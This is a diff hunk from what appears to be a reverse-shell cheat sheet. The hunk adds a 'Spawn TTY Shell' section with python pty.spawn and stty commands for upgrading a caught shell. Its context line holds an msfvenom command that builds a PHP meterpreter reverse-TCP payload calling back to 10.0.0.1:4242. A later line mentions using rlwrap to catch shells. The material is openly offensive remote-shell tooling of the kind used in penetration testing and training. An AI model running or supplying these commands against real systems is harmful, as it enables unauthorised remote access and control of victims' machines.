@@ -441,7 +441,12 @@ $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > s
 ```
 
 ## Spawn TTY Shell
-
+````
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo; fg
+`````
 In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.
 
 ```powershell
